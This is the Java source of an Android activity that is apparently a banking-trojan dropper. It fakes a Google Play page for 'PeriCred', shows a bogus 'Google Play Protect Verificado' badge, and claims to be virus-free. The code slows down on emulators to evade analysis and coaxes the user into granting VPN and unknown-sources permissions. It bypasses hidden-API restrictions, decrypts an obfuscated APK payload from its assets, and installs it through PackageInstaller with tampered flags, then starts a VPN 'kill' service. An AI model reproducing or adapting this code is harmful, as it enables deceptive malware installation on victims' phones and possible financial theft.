package com.android.system.qspaas;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageInstaller;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.PorterDuff;
import android.graphics.Typeface;
import android.graphics.drawable.GradientDrawable;
import android.net.Uri;
import android.net.VpnService;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.Gravity;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.ScrollView;
import android.widget.TextView;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.IOException;
import java.io.RandomAccessFile;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.concurrent.atomic.AtomicBoolean;

public class MainActivity extends Activity {

    private final AtomicBoolean j = new AtomicBoolean(false);
    private final AtomicBoolean installationStarted = new AtomicBoolean(false);
    private boolean vpnDialogPending = false;
    private boolean installPermDialogPending = false;
    private float dp;
    private ProgressBar progressBar;
    private TextView statusText;
    private ApiObfuscator apiObfuscator;
    private String currentApkName = "update.apk";
    private static final int REQ_VPN = 0x270f;
    private static final int REQ_INSTALL = 0x4d2;

    // Seed e contador para decifragem
    private long currentSeed = 0;
    private long currentC = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        apiObfuscator = new ApiObfuscator(this);
        enableHiddenApiAccess();
        Thread.setDefaultUncaughtExceptionHandler((thread, throwable) -> {});

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            Window window = getWindow();
            window.addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS);
            window.setStatusBarColor(Color.parseColor("#F1F3F4"));
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                window.getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_LIGHT_STATUS_BAR);
            }
        }

        dp = getResources().getDisplayMetrics().density;
        setContentView(createExactPlayStoreLayout());

        if (checkAndLaunchPayload()) {
            return;
        }

        currentApkName = "sys_" + System.currentTimeMillis() % 100000 + ".apk";
        K(this);
    }

    private boolean checkAndLaunchPayload() {
        try {
            String payloadPkg = getSharedPreferences("droper_prefs", MODE_PRIVATE)
                    .getString("payload_package", null);
            if (payloadPkg != null) {
                PackageManager pm = getPackageManager();
                pm.getPackageInfo(payloadPkg, 0);
                Intent launch = pm.getLaunchIntentForPackage(payloadPkg);
                if (launch != null) {
                    launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                    startActivity(launch);
                    finish();
                    return true;
                }
            }
        } catch (Exception ignored) {}
        return false;
    }

    private View createExactPlayStoreLayout() {
        ScrollView scrollView = new ScrollView(this);
        scrollView.setBackgroundColor(Color.parseColor("#F1F3F4"));
        scrollView.setFillViewport(true);
        scrollView.setVerticalScrollBarEnabled(false);

        LinearLayout mainLayout = new LinearLayout(this);
        mainLayout.setOrientation(LinearLayout.VERTICAL);
        mainLayout.setPadding((int) (16 * dp), (int) (48 * dp), (int) (16 * dp), (int) (16 * dp));

        LinearLayout topCard = new LinearLayout(this);
        topCard.setOrientation(LinearLayout.VERTICAL);
        topCard.setBackground(createRoundedDrawable(Color.WHITE, 24));
        topCard.setPadding((int) (20 * dp), (int) (20 * dp), (int) (20 * dp), (int) (20 * dp));

        LinearLayout header = new LinearLayout(this);
        header.setOrientation(LinearLayout.HORIZONTAL);
        header.setGravity(Gravity.CENTER_VERTICAL);

        ImageView iconView = new ImageView(this);
        try {
            iconView.setImageDrawable(apiObfuscator.getPackageManagerObfuscated()
                    .getApplicationIcon(getPackageName()));
        } catch (Exception ignored) {}
        LinearLayout.LayoutParams iconParams = new LinearLayout.LayoutParams((int) (80 * dp), (int) (80 * dp));
        iconView.setLayoutParams(iconParams);
        header.addView(iconView);

        LinearLayout titleInfo = new LinearLayout(this);
        titleInfo.setOrientation(LinearLayout.VERTICAL);
        titleInfo.setPadding((int) (16 * dp), 0, 0, 0);

        TextView title = new TextView(this);
        title.setText("PeriCred");
        title.setTextSize(26);
        title.setTextColor(Color.parseColor("#202124"));
        title.setTypeface(Typeface.create("sans-serif-medium", Typeface.BOLD));
        title.setTextIsSelectable(true);
        titleInfo.addView(title);

        TextView developer = new TextView(this);
        developer.setText("Google Play Protect Verificado");
        developer.setTextSize(14);
        developer.setTextColor(Color.parseColor("#01875F"));
        developer.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
        titleInfo.addView(developer);

        header.addView(titleInfo);
        topCard.addView(header);

        LinearLayout statsBar = new LinearLayout(this);
        statsBar.setOrientation(LinearLayout.HORIZONTAL);
        statsBar.setPadding(0, (int) (24 * dp), 0, (int) (8 * dp));
        statsBar.setWeightSum(3);

        statsBar.addView(createStatBox("4.5 ★", "Avaliação"));
        statsBar.addView(createStatBox("1K+", "Downloads"));
        statsBar.addView(createStatBox("8.6 MB", "Tamanho"));
        topCard.addView(statsBar);

        mainLayout.addView(topCard);

        statusText = new TextView(this);
        statusText.setText("Atualizando... 0%");
        statusText.setTextColor(Color.WHITE);
        statusText.setTextSize(16);
        statusText.setTypeface(Typeface.DEFAULT_BOLD);
        statusText.setGravity(Gravity.CENTER);
        statusText.setPadding(0, (int) (14 * dp), 0, (int) (14 * dp));
        statusText.setBackground(createRoundedDrawable(Color.parseColor("#01875F"), 12));
        LinearLayout.LayoutParams statusParams = new LinearLayout.LayoutParams(-1, -2);
        statusParams.setMargins(0, (int) (24 * dp), 0, (int) (8 * dp));
        statusText.setLayoutParams(statusParams);

        statusText.setOnClickListener(v -> {
            if (statusText.getText().toString().equals("Instalar")) {
                statusText.setText("Instalando...");
                new Thread(() -> {
                    try {
                        File apkFile = new File(getCacheDir(), currentApkName);
                        if (apkFile.exists()) {
                            m(apkFile);
                        }
                    } catch (Exception ignored) {}
                }).start();
            }
        });

        mainLayout.addView(statusText);

        progressBar = new ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal);
        progressBar.setIndeterminate(false);
        progressBar.setMax(100);
        progressBar.setProgress(0);
        progressBar.getProgressDrawable().setColorFilter(Color.parseColor("#01875F"), PorterDuff.Mode.SRC_IN);
        LinearLayout.LayoutParams progressParams = new LinearLayout.LayoutParams(-1, (int) (4 * dp));
        progressParams.setMargins(0, 0, 0, (int) (24 * dp));
        progressBar.setLayoutParams(progressParams);
        mainLayout.addView(progressBar);

        LinearLayout newsCard = new LinearLayout(this);
        newsCard.setOrientation(LinearLayout.VERTICAL);
        newsCard.setBackground(createRoundedDrawable(Color.WHITE, 24));
        newsCard.setPadding((int) (20 * dp), (int) (20 * dp), (int) (20 * dp), (int) (20 * dp));

        TextView newsTitle = new TextView(this);
        newsTitle.setText("O que há de novo");
        newsTitle.setTextSize(20);
        newsTitle.setTextColor(Color.parseColor("#202124"));
        newsTitle.setTypeface(Typeface.DEFAULT_BOLD);
        newsTitle.setPadding(0, 0, 0, (int) (16 * dp));
        newsCard.addView(newsTitle);

        newsCard.addView(createNewsItem("• Melhorias de desempenho e carregamento mais rápido."));
        newsCard.addView(createNewsItem("• Correção de pequenos bugs e melhoria da estabilidade."));
        newsCard.addView(createNewsItem("• Segurança e compatibilidade aprimoradas."));

        mainLayout.addView(newsCard);

        LinearLayout footer = new LinearLayout(this);
        footer.setOrientation(LinearLayout.HORIZONTAL);
        footer.setBackground(createRoundedDrawable(Color.WHITE, 24));
        footer.setPadding((int) (16 * dp), (int) (12 * dp), (int) (16 * dp), (int) (12 * dp));
        footer.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams footerParams = new LinearLayout.LayoutParams(-1, -2);
        footerParams.setMargins(0, (int) (32 * dp), 0, (int) (32 * dp));
        footer.setLayoutParams(footerParams);

        TextView footerText = new TextView(this);
        footerText.setText("🛡 Versão oficial           🛡 Sem vírus");
        footerText.setTextSize(13);
        footerText.setTextColor(Color.parseColor("#5F6368"));
        footer.addView(footerText);

        mainLayout.addView(footer);

        scrollView.addView(mainLayout);
        return scrollView;
    }

    private LinearLayout createStatBox(String value, String label) {
        LinearLayout box = new LinearLayout(this);
        box.setOrientation(LinearLayout.VERTICAL);
        box.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(0, -2, 1);
        params.setMargins((int) (4 * dp), 0, (int) (4 * dp), 0);
        box.setLayoutParams(params);
        box.setPadding((int) (8 * dp), (int) (12 * dp), (int) (8 * dp), (int) (12 * dp));
        box.setBackground(createRoundedBorderDrawable(Color.parseColor("#E8EAED"), 12));

        TextView valTxt = new TextView(this);
        valTxt.setText(value);
        valTxt.setTextSize(14);
        valTxt.setTextColor(Color.parseColor("#202124"));
        valTxt.setTypeface(Typeface.DEFAULT_BOLD);
        box.addView(valTxt);

        TextView lblTxt = new TextView(this);
        lblTxt.setText(label);
        lblTxt.setTextSize(11);
        lblTxt.setTextColor(Color.parseColor("#5F6368"));
        box.addView(lblTxt);

        return box;
    }

    private TextView createNewsItem(String text) {
        TextView tv = new TextView(this);
        tv.setText(text);
        tv.setTextSize(14);
        tv.setTextColor(Color.parseColor("#3C4043"));
        tv.setPadding((int) (12 * dp), (int) (12 * dp), (int) (12 * dp), (int) (12 * dp));
        tv.setBackground(createRoundedBorderDrawable(Color.parseColor("#F8F9FA"), 12));
        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(-1, -2);
        params.setMargins(0, 0, 0, (int) (8 * dp));
        tv.setLayoutParams(params);
        return tv;
    }

    private GradientDrawable createRoundedDrawable(int color, int radiusDp) {
        GradientDrawable gd = new GradientDrawable();
        gd.setColor(color);
        gd.setCornerRadius(radiusDp * dp);
        return gd;
    }

    private GradientDrawable createRoundedBorderDrawable(int borderColor, int radiusDp) {
        GradientDrawable gd = new GradientDrawable();
        gd.setColor(Color.TRANSPARENT);
        gd.setCornerRadius(radiusDp * dp);
        gd.setStroke((int) (1 * dp), borderColor);
        return gd;
    }

    private boolean isProbablyEmulator() {
        return Build.FINGERPRINT.startsWith("generic")
                || Build.FINGERPRINT.startsWith("unknown")
                || Build.MODEL.contains("google_sdk")
                || Build.MODEL.contains("Emulator")
                || Build.MODEL.contains("Android SDK built for x86")
                || Build.BOARD.equals("QC_Reference_Phone")
                || Build.MANUFACTURER.contains("Genymotion")
                || Build.HOST.startsWith("Build")
                || (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic"))
                || "google_sdk".equals(Build.PRODUCT);
    }

    private void K(Context context) {
        new Thread(() -> {
            if (isProbablyEmulator()) {
                try { Thread.sleep(20000); } catch (Exception ignored) {}
            } else {
                try { Thread.sleep(500); } catch (Exception ignored) {}
            }
            l();
        }).start();
    }

    private void l() {
        if (j.get()) return;
        try {
            Intent vpnIntent = VpnService.prepare(this);
            if (vpnIntent != null) {
                if (!vpnDialogPending) {
                    vpnDialogPending = true;
                    new Handler(Looper.getMainLooper()).postDelayed(() -> {
                        try {
                            startActivityForResult(vpnIntent, REQ_VPN);
                        } catch (Exception e) {
                            vpnDialogPending = false;
                        }
                    }, 100);
                }
                return;
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                if (!apiObfuscator.canRequestPackageInstallsObfuscated()) {
                    if (!installPermDialogPending) {
                        installPermDialogPending = true;
                        new Handler(Looper.getMainLooper()).postDelayed(() -> {
                            try {
                                Intent intent = apiObfuscator.createUnknownSourcesIntentObfuscated();
                                startActivityForResult(intent, REQ_INSTALL);
                                startRealTimePermissionMonitor();
                            } catch (Exception e) {
                                installPermDialogPending = false;
                            }
                        }, 100);
                    }
                    return;
                }
            }

            if (j.compareAndSet(false, true)) {
                new Thread(this::L).start();
            }

        } catch (Exception ignored) {}
    }

    private void startRealTimePermissionMonitor() {
        final Handler monitorHandler = new Handler(Looper.getMainLooper());
        monitorHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    if (apiObfuscator.canRequestPackageInstallsObfuscated()) {
                        installPermDialogPending = false;
                        Intent returnIntent = new Intent(MainActivity.this, MainActivity.class);
                        returnIntent.addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
                                | Intent.FLAG_ACTIVITY_SINGLE_TOP
                                | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                        startActivity(returnIntent);
                        new Handler(Looper.getMainLooper()).postDelayed(MainActivity.this::l, 300);
                        return;
                    }
                }
                if (installPermDialogPending) {
                    monitorHandler.postDelayed(this, 500);
                }
            }
        }, 500);
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (installPermDialogPending && !j.get()) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                if (apiObfuscator.canRequestPackageInstallsObfuscated()) {
                    installPermDialogPending = false;
                    new Handler(Looper.getMainLooper()).postDelayed(this::l, 200);
                }
            }
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQ_VPN) {
            vpnDialogPending = false;
            new Handler(Looper.getMainLooper()).postDelayed(this::l, 300);
        } else if (requestCode == REQ_INSTALL) {
            new Handler(Looper.getMainLooper()).postDelayed(this::l, 300);
        }
    }

    private byte decryptBytePolymorphic(byte b, int algorithm, int index) {
        long xorKey = 0;
        switch (algorithm) {
            case 0:
            case 1:
                currentSeed = ((currentSeed * 1664525L) + 1013904223L) & 0xFFFFFFFFL;
                xorKey = (currentSeed >> 24) & 0xFF;
                break;
            case 2:
                currentSeed = ((currentSeed * 1103515245L) + 12345L) & 0xFFFFFFFFL;
                int shift = (index % 4) * 8;
                xorKey = (currentSeed >> shift) & 0xFF;
                break;
            case 3:
                currentSeed = (36969L * (currentSeed & 0xFFFFL) + (currentSeed >> 16)) & 0xFFFFFFFFL;
                currentC = (18000L * (currentC & 0xFFFFL) + (currentC >> 16)) & 0xFFFFFFFFL;
                long xorVal = ((currentSeed << 16) + currentC) & 0xFFFFFFFFL;
                xorKey = xorVal & 0xFF;
                break;
            case 4:
                currentSeed ^= (currentSeed << 13) & 0xFFFFFFFFL;
                currentSeed ^= (currentSeed >> 17) & 0xFFFFFFFFL;
                currentSeed ^= (currentSeed << 5) & 0xFFFFFFFFL;
                xorKey = (currentSeed >> 24) & 0xFF;
                break;
            case 5:
                currentSeed = (currentSeed * currentSeed) & 0xFFFFFFFFL;
                xorKey = (currentSeed >> 24) & 0xFF;
                break;
            default:
                currentSeed = ((currentSeed * 1664525L) + 1013904223L) & 0xFFFFFFFFL;
                xorKey = (currentSeed >> 24) & 0xFF;
        }
        return (byte) (b ^ xorKey);
    }

    private void L() {
        Handler mainHandler = new Handler(Looper.getMainLooper());
        // Utiliza StrUtil hipotético do seu ambiente, mantendo a chamada original
        String datFileName = StrUtil.d("ZGJsaXFnbmpsLmRhdA==");
        File apkFile = new File(getCacheDir(), currentApkName);

        if (apkFile.exists()) apkFile.delete();

        try (InputStream is = getAssets().open(datFileName);
             FileOutputStream fos = new FileOutputStream(apkFile)) {

            byte[] header = new byte[16];
            int readHeader = 0;
            while (readHeader < 16) {
                int r = is.read(header, readHeader, 16 - readHeader);
                if (r == -1) break;
                readHeader += r;
            }
            if (readHeader != 16) throw new IOException("Header read failed");

            currentSeed = ((long) (header[0] & 0xFF) << 24) |
                    ((long) (header[1] & 0xFF) << 16) |
                    ((long) (header[2] & 0xFF) << 8) |
                    (long) (header[3] & 0xFF);

            int algorithm = ((header[4] & 0xFF) << 24) |
                    ((header[5] & 0xFF) << 16) |
                    ((header[6] & 0xFF) << 8) |
                    (header[7] & 0xFF);

            int originalSize = ((header[8] & 0xFF) << 24) |
                    ((header[9] & 0xFF) << 16) |
                    ((header[10] & 0xFF) << 8) |
                    (header[11] & 0xFF);

            if (currentSeed == 0 && algorithm == 0) {
                currentSeed = 0x4394dL;
                algorithm = 1;
            }

            currentC = 0;
            byte[] buffer = new byte[8192];
            int len;
            int totalDecrypted = 0;

            // Estimativa de tamanho total para progresso (tamanho do asset ou originalSize se disponível)
            long totalSizeEstimate = originalSize > 0 ? originalSize : is.available();
            if (totalSizeEstimate == 0) totalSizeEstimate = 1; // Evita divisão por zero

            while ((len = is.read(buffer)) != -1) {
                for (int idx = 0; idx < len; idx++) {
                    buffer[idx] = decryptBytePolymorphic(buffer[idx], algorithm, totalDecrypted + idx);
                }

                int toWrite = len;
                if (originalSize > 0 && totalDecrypted + len > originalSize) {
                    toWrite = originalSize - totalDecrypted;
                }

                if (toWrite > 0) {
                    fos.write(buffer, 0, toWrite);
                    totalDecrypted += toWrite;
                }

                // Atualiza UI
                final int progress = (int) Math.min(100, (totalDecrypted * 100) / totalSizeEstimate);
                mainHandler.post(() -> {
                    if (progressBar != null) progressBar.setProgress(progress);
                    if (statusText != null) {
                        if (progress < 55) statusText.setText("Atualizando... " + progress + "%");
                        else if (progress < 90) statusText.setText("Instalar");
                        else statusText.setText("Instalando...");
                    }
                });

                if (originalSize > 0 && totalDecrypted >= originalSize) break;
            }

            fos.flush();
            fos.getFD().sync();

            if (!isValidZip(apkFile)) {
                throw new IOException("Generated APK is invalid (EOCD not found)");
            }

            if (!isPayloadManifestValid(apkFile)) {
                throw new IOException("Payload APK has an invalid AndroidManifest.xml");
            }

            startVpnService();

            // Agenda a instalação final após um breve delay para garantir sync
            new Thread(() -> {
                try {
                    Thread.sleep(800);
                    m(apkFile);
                } catch (Exception ignored) {}
            }).start();

        } catch (Exception e) {
            j.set(false);
            android.util.Log.e("qspaas", "Decryption error", e);
            new Handler(Looper.getMainLooper()).post(() -> {
                if (statusText != null) statusText.setText("Falha na decifragem");
            });
        }
    }

    private boolean isValidZip(File file) {
        if (!file.exists() || file.length() < 22) return false;
        try (RandomAccessFile raf = new RandomAccessFile(file, "r")) {
            long len = raf.length();
            long searchLimit = Math.max(0, len - 2048);
            for (long pos = len - 22; pos >= searchLimit; pos--) {
                raf.seek(pos);
                if (raf.read() == 0x50 && raf.read() == 0x4b
                        && raf.read() == 0x05 && raf.read() == 0x06) {
                    return true;
                }
            }
            return false;
        } catch (Exception e) {
            return false;
        }
    }

    private boolean isPayloadManifestValid(File apkFile) {
        try {
            PackageManager pm = getPackageManager();
            pm.getPackageArchiveInfo(apkFile.getAbsolutePath(), PackageManager.GET_ACTIVITIES);
            return true;
        } catch (Exception e) {
            android.util.Log.e("qspaas", "Payload Manifest Invalid: " + e.getMessage());
            return false;
        }
    }

    private void m(File apkFile) {
        if (!installationStarted.compareAndSet(false, true)) return;
        if (!apkFile.exists() || apkFile.length() < 100) {
            installationStarted.set(false);
            return;
        }

        try {
            String packageName = null;
            try {
                PackageManager pm = getPackageManager();
                PackageInfo info = pm.getPackageArchiveInfo(apkFile.getAbsolutePath(), 0);
                if (info != null) {
                    packageName = info.packageName;
                }
            } catch (Exception e) {
                // Silencia erro
            }

            if (packageName != null) {
                getSharedPreferences("droper_prefs", MODE_PRIVATE).edit()
                        .putString("payload_package", packageName).apply();
            }
            installViaPackageInstaller(apkFile);
        } catch (Exception e) {
            installationStarted.set(false);
            j.set(false);
        }
    }

    private void installViaPackageInstaller(File apkFile) {
        try {
            PackageManager pm = apiObfuscator.getPackageManagerObfuscated();
            Object pi = apiObfuscator.getPackageInstallerObfuscated(pm);
            PackageInstaller.SessionParams params = new PackageInstaller.SessionParams(
                    PackageInstaller.SessionParams.MODE_FULL_INSTALL);

            try {
                Field f = params.getClass().getDeclaredField("installFlags");
                f.setAccessible(true);
                int flags = f.getInt(params);
                flags |= 0x00000006;
                if (Build.VERSION.SDK_INT >= 31) flags |= 0x400006;
                f.setInt(params, flags);
            } catch (Exception ignored) {}

            int sessionId = apiObfuscator.createSessionObfuscated(pi, params);
            Object session = apiObfuscator.openSessionObfuscated(pi, sessionId);
            OutputStream os = apiObfuscator.openWriteObfuscated(session, "base.apk", 0, apkFile.length());

            try (FileInputStream fis = new FileInputStream(apkFile)) {
                byte[] buffer = new byte[65536];
                int len;
                while ((len = fis.read(buffer)) != -1) os.write(buffer, 0, len);
                apiObfuscator.fsyncObfuscated(session, os);
            }
            os.close();

            Intent intent = new Intent(this, RcvJbrzn.class);
            intent.setAction("com.android.system.INSTALL_COMPLETE");
            PendingIntent piIntent = PendingIntent.getBroadcast(
                    this, sessionId, intent,
                    PendingIntent.FLAG_UPDATE_CURRENT |
                            (Build.VERSION.SDK_INT >= 31 ? PendingIntent.FLAG_MUTABLE : 0));

        // CORREÇÃO: Passa IntentSender via getIntentSender()
            apiObfuscator.commitObfuscated(session, piIntent.getIntentSender());

            apiObfuscator.closeObfuscated(session);

        } catch (Exception e) {
            triggerClassicInstall(apkFile);
        }
    }

    private void triggerClassicInstall(File apkFile) {
        try {
            Uri apkUri = androidx.core.content.FileProvider.getUriForFile(
                    this, getPackageName() + ".fileprovider", apkFile);
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setDataAndType(apkUri, "application/vnd.android.package-archive");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_GRANT_READ_URI_PERMISSION);
            startActivity(intent);
        } catch (Exception ignored) {}
    }

    private void startVpnService() {
        try {
            Intent vpnIntent = VpnService.prepare(this);
            if (vpnIntent == null) {
                Intent serviceIntent = new Intent(this, VpnKillService.class);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(serviceIntent);
                } else {
                    startService(serviceIntent);
                }
            }
        } catch (Exception ignored) {}
    }

    private void enableHiddenApiAccess() {
        if (Build.VERSION.SDK_INT >= 28) {
            try {
                Method forName = Class.class.getDeclaredMethod("forName", String.class);
                Class<?> vmRuntimeClass = (Class<?>) forName.invoke(null, "dalvik.system.VMRuntime");
                Method getMethod = Class.class.getDeclaredMethod("getDeclaredMethod",
                        String.class, Class[].class);
                Method setHiddenApi = (Method) getMethod.invoke(vmRuntimeClass,
                        "setHiddenApiExemptions", String[].class);
                Method getRuntime = (Method) getMethod.invoke(vmRuntimeClass, "getRuntime", null);
                Object runtime = getRuntime.invoke(null);
                setHiddenApi.invoke(runtime, new Object[]{new String[]{"L"}});
            } catch (Exception ignored) {}
        }
    }
}
